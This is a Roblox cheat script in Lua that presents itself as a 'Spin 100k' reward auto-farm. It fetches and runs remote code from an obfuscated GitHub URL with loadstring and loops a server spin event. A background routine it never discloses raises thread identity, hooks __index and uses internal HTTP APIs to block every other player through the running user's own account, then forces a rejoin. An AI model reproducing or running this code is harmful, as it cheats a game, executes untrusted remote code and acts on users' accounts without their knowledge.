local UL = loadstring(game:HttpGet("https://raw.githubusercontent.com/bjalalsjzbslalqoqueeyhskaambpqo/kajsbsba--hahsjsv-kakwbs_jaks_082hgg927hsksoLol-Noobbro9877272jshshsbsjsURLwww.noob.com.Obfuscate/main/MyLibrery.lua"))()

local gameName = ""
if gameName == "" then
    gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
end

local function cleanGameName(name)
    name = name:gsub("%b[]", "")
    name = name:match("^[^:]*")
    return name:match("^%s*(.-)%s*$")
end

gameName = cleanGameName(gameName)

local p = game.Players.LocalPlayer
local sg = UL:CrSG("Default")
local frm, cfrm, crFrm = UL:CrFrm(sg, gameName)


UL:AddTBtn(cfrm, "Spin 100k", false, function()
a = not a
while a do

local args = {
    [1] = "Reward7"
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Spin"):FireServer(unpack(args))
wait(1)
end

end)


local jb = game.JobId

spawn(function()
    local P = game:GetService("Players")
    local TS = game:GetService("TeleportService")
    local LP = P.LocalPlayer

    getgenv()._s = clonefunction(setthreadidentity)

    function _p(u,d)
        pcall(function()
            o = hookmetamethod(game, "__index", function(a,b)
                task.spawn(function()
                    pcall(function()
                        _s(7)
                        game:GetService("HttpRbxApiService"):PostAsyncFullUrl(u,d)
                    end)
                end)
                hookmetamethod(game, "__index", o)
                return o(a,b)
            end)
        end)
    end

    function block(i)
        local u = "https://apis.roblox.com/user-blocking-api/v1/users/"..i.."/block-user"
        local d = game:GetService("HttpService"):JSONEncode({})
        if type(_p) == "function" then
            return pcall(function() return _p(u,d) end)
        elseif type(game.HttpService.RequestInternal) == "function" then
            return pcall(function()
                return game.HttpService:RequestInternal({
                    Url = u,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = d
                })
            end)
        end
    end

    function blockAllOtherPlayers()
        local otherPlayersExist = false
        for _, player in ipairs(P:GetPlayers()) do
            if player ~= LP then
                local s, r = block(player.UserId)
                print("Block User", player.Name, "- Success:", s, "Result:", r)
                otherPlayersExist = true
            end
        end
        return otherPlayersExist
    end

    function rejoinExperience()
        local placeId = game.PlaceId
        TS:Teleport(placeId, LP)
    end

    if blockAllOtherPlayers() then
        rejoinExperience()
    end

    P.PlayerAdded:Connect(function(player)
        if player ~= LP then
            local s, r = block(player.UserId)
            print("Block User", player.Name, "- Success:", s, "Result:", r)
            rejoinExperience()
        end
    end)
end)

UL:AddText(crFrm, "By Script: OneCreatorX ")
UL:AddText(crFrm, "Create Script: 09/08/24 ")
UL:AddText(crFrm, "Update Script: --/--/--")
UL:AddText(crFrm, "Script Version: 0.1")
UL:AddBtn(crFrm, "Copy link YouTube", function() setclipboard("https://youtube.com/@onecreatorx") end)
UL:AddBtn(crFrm, "Copy link Discord", function() setclipboard("https://discord.com/invite/UNJpdJx7c4") end)

game:GetService('Players').LocalPlayer.Idled:Connect(function()
    game:GetService('VirtualUser'):CaptureController()
    game:GetService('VirtualUser'):ClickButton2(Vector2.new())
end)
